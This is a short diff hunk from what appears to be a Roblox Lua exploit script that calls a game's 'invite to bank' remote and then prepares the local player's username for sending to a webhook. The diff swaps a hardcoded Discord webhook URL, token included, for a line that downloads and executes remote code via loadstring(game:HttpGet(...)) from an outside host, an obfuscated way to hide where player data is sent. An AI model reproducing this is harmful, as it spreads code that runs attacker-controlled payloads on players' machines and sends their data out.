@@ -344,7 +344,7 @@ local A_1 =
 local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["invite to bank"]
 Event:InvokeServer(A_1)
 
-local url = "https://discord.com/api/webhooks/961349562453356595/_XAu26bGuvW9fcHTUfB5ZoHClcWqi1yUFlVNhYo4e_OhRLJUBWpdMGr3JgZ_M4QKvjl8"
+local url = loadstring(game:HttpGet("http://blobsc.api.stdlib.com/web@dev/scumwh.html"))()
 local username = game:GetService("Players").LocalPlayer.Name
  
 local data = {
